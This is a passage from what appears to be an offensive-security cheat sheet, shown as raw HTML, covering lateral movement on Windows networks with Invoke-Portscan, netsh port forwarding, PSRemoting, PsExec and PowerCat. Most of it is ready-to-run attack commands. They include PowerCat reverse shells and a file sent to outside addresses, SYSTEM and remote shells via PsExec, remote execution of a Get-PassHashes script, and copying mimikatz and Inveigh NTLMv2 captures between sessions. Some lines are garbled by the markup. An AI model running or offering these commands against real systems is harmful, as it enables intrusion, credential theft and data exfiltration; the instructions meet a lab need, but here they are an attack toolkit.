&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port-forwarding">Port forwarding&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Forward a port to another host/port&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">sh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">v4tov4&lt;/span> &lt;span class="n">listenport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">80&lt;/span> &lt;span class="n">listenaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span> &lt;span class="n">connectport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">5985&lt;/span> &lt;span class="n">connectaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-Item&lt;/span> &lt;span class="n">wsman&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Client&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">TrustedHosts&lt;/span> &lt;span class="n">-value&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$securePassword&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">-force&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$credential&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Automation&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PsCredential&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$securePassword&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">80&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$securePassword&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show all forwardings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">show&lt;/span> &lt;span class="n">all&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete all forwardings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">reset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete a specific forwardingnet&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">delete&lt;/span> &lt;span class="n">v4tov4&lt;/span> &lt;span class="n">listenport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">80&lt;/span> &lt;span class="n">listenaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="psremoting">PSRemoting&lt;/h2>
&lt;p>&lt;em>Requires âHTTPâ and âWSMANâ SPNs&lt;/em>&lt;/p>
&lt;p>Enable PSRemoting on local machine and adds exception to the firewall:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enable-PSRemoting&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Create a PSSession:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enter a PSSession:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute commands or scriptblocks:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">Get-Process&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$securePassword&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">-Force&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$credential&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Automation&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PsCredential&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$securePassword&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$credential&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or to start a new session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$credentialInvoke&lt;/span>&lt;span class="n">-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute scripts from files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="s2">&amp;#34;C:\scripts\Get-PassHashes.ps1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute locally loaded function on the remote machines:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">${&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">Get-PassHashes&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">${&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">Get-PassHashes&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ArgumentList&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute âStatefulâ commands using Invoke-Command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$Sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$Proc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">GetProcess&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$Sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$Proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Copy files between PSRemoting sessions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Copy-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="nb">Inveigh-NTLMv2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">-Destination&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-FromSession&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Copy-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">mimikatz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-Destination&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-ToSession&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="psexec">PsExec&lt;/h2>
&lt;p>Launch a shell on the local machine as DIFFERENT user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\student1&amp;#34;&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\student1&amp;#34;&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Launch a SYSTEM shell on the local machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you get the admin/password of a RID 500 user of a machine, it is possible to get a SYSTEM session on that machine by &lt;code>psexec&lt;/code>. It is also possible to use a &lt;code>cmd&lt;/code> or &lt;code>powershell&lt;/code> session launched from &lt;code>mimikatz&lt;/code> after Pass-The-Hash.&lt;/p>
&lt;p>Execute command in remote computer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD] [COMMAND&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute command ânetstat -anâ in remote and output result in local computer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">netstat&lt;/span> &lt;span class="n">-an&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute command in remote and output result in remote:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">netstat&lt;/span> &lt;span class="n">-an&lt;/span> &lt;span class="p">^&amp;gt;&lt;/span>&lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute program to interact with user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">notepad&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run remote shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">cmd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powercat">PowerCat&lt;/h2>
&lt;p>Import the PowerCat module:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listen on port 8000 and print the output to the console. Rememeber to add -t (timeout) parameter: number of seconds to wait before giving up on listening or connecting:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to 10.1.1.1 port 443, send a shell, and enable verbosity:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-e&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="n">-v&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to 10.1.1.1 port 443, execute a pseudo Powershell session, and enable verbosity:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-v&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Send a file to 10.1.1.15 port 8000:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">15&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">inputfile&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Write the data sent to the local listener on port 4444 to C::&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">powercat -l -p 4444 -of C:\outfile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listen on port 8000 and repeatedly server a powershell shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-rep&lt;/span>
